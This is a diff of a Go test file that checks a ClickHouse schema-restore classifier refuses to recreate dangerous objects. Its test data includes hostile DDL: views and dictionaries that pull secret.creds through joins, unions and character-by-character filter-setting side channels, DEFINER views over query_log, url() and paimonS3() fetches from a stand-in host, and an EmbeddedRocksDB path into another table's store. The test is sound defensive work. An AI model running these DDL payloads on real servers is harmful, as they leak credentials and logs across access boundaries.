+		{KindDictionary, "CREATE DICTIONARY shop.dx\n(\n    `id` UInt64,\n    `v` String\n)\nPRIMARY KEY id\nSOURCE(CLICKHOUSE(DB 'shop' TABLE 'src'))\nLIFETIME(MIN 0 MAX 0)\nLAYOUT(HASHED())\n" +
+			"SETTINGS(additional_result_filter = 'substring((SELECT arrayStringConcat(groupArray(x), \\',\\') FROM secret.creds), intDiv(id, 256) + 1, 1) = char(id % 256)')"},
+		{KindView, "CREATE VIEW shop.v AS SELECT ‘'’ AS a, x FROM url('http://e/', 'CSV', 'x String') -- '"},
+		{KindView, "CREATE VIEW shop.a1\n(\n    `s.x` String\n)\nAS SELECT s.x\nFROM shop.order AS o, secret.creds AS s"},
+		{KindView, "CREATE VIEW shop.a3\n(\n    `s.x` String\n)\nAS SELECT s.x\nFROM shop.t AS where, secret.creds AS s"},
+		{KindView, "CREATE VIEW shop.c1b\n(\n    `number` UInt64\n)\nAS SELECT number\nFROM numbers(100)\nWHERE number IN (secret.nums)"},
+		{KindView, "CREATE VIEW shop.c2\n(\n    `number` UInt64\n)\nAS SELECT number\nFROM numbers(100)\nWHERE nullIn(number, secret.nums)"},
+		{KindView, "CREATE VIEW shop.d4\n(\n    `n` UInt64\n)\nAS SELECT n\nFROM shop.grid\n" +
+			"SETTINGS additional_table_filters = {'shop.grid':'substring((SELECT arrayStringConcat(groupArray(x), \\',\\') FROM secret.creds), intDiv(n, 256) + 1, 1) = char(n % 256)'}"},
+		{KindView, "CREATE VIEW shop.v DEFINER = default SQL SECURITY DEFINER AS SELECT * FROM query_log"},
+		{KindView, "CREATE VIEW shop.v AS SELECT * FROM merge(currentDatabase(), '^query_log$')"},
+		{KindView, "CREATE VIEW shop.v AS SELECT * FROM ((SELECT 1 AS x) UNION ALL SELECT x FROM secret.creds)"},
+		{KindMaterializedView, "CREATE MATERIALIZED VIEW shop.mv TO shop.t (`x` String) DEFINER = default SQL SECURITY DEFINER AS SELECT s.x FROM shop.src AS e, secret.creds AS s"},
+		{KindMaterializedView, "CREATE MATERIALIZED VIEW shop.mv TO query_log AS SELECT * FROM shop.src"},
+		{KindMaterializedView, "CREATE MATERIALIZED VIEW shop.mv ENGINE = MergeTree ORDER BY x POPULATE AS SELECT x FROM shop.src"},
+		{KindOther, "CREATE LIVE VIEW shop.lv AS SELECT 1"},
 	}
-	for _, c := range cases {
-		ddl := c.ddl
-		name := map[string]string{KindDictionary: "d", KindView: "v", KindMaterializedView: "mv", KindTable: "t"}[c.kind]
-		cl, err := classify("shop", Table{Name: name, Kind: c.kind, Engine: c.engine}, ddl, restored)
-		if err != nil {
-			t.Errorf("%s: %v", c.name, err)
-			continue
-		}
-		if cl.create || !strings.Contains(cl.reason, c.why) {
-			t.Errorf("%s: create=%v reason=%q, want a skip with %q", c.name, cl.create, cl.reason, c.why)
-		}
-		if strings.Contains(cl.reason, "http") || strings.Contains(cl.reason, "source-ch") {
-			t.Errorf("%s: reason carries DDL: %q", c.name, cl.reason)
+	for _, c := range others {
+		o, err := classify("shop", Table{Name: "x", Kind: c.kind}, c.ddl)
+		if err != nil || o.create || o.reason != notRecreated {
+			t.Errorf("%s %q: create=%v reason=%q err=%v", c.kind, c.ddl, o.create, o.reason, err)
 		}
 	}
-	// POPULATE is refused outright (SHOW CREATE never writes it).
-	if _, err := classify("shop", Table{Name: "mv", Kind: KindMaterializedView}, "CREATE MATERIALIZED VIEW shop.mv ENGINE = MergeTree ORDER BY x POPULATE AS SELECT x FROM shop.src", restored); err == nil || !strings.Contains(err.Error(), "POPULATE") {
-		t.Errorf("POPULATE: %v", err)
+	tables := []struct{ engine, ddl string }{
+		{"Merge", "CREATE TABLE shop.t (`query` String) ENGINE = Merge(currentDatabase(), '^query_log$')"},
+		{"Dictionary", "CREATE TABLE shop.t (`id` UInt64) ENGINE = Dictionary(xmldict)"},
+		{"Buffer", "CREATE TABLE shop.t (`x` UInt64) ENGINE = Buffer(currentDatabase(), 'query_log', 1, 1, 1, 1, 1, 1, 1)"},
+		{"MergeTree", "CREATE TABLE shop.t (`d` Date, `x` UInt64) ENGINE = MergeTree ORDER BY x TTL d + toIntervalDay(dictGet('secret.d', 'v', x))"},
+		{"MergeTree", "CREATE TABLE shop.t (`x` UInt64, INDEX i joinGet('secret.j','v',x) TYPE minmax) ENGINE = MergeTree ORDER BY x"},
+		{"MergeTree", "CREATE TABLE shop.t (`x` UInt64) ENGINE = MergeTree ORDER BY x SETTINGS disk = 'default'"},
+		{"MergeTree", "CREATE TABLE shop.t (`k` String DEFAULT (SELECT any(x) FROM paimonS3('http://e/', 'k', 's'))) ENGINE = MergeTree ORDER BY k"},
+		{"EmbeddedRocksDB", "CREATE TABLE shop.t (`k` String, `v` String) ENGINE = EmbeddedRocksDB(0, '/var/lib/clickhouse/store/abc/other_rocksdb', 1) PRIMARY KEY k"},
+	}
+	for _, c := range tables {
+		o, err := classify("shop", Table{Name: "t", Kind: KindTable, Engine: c.engine}, c.ddl)
+		if err != nil || o.create {
+			t.Errorf("%q: create=%v reason=%q err=%v", c.ddl, o.create, o.reason, err)
+		}
 	}
 }
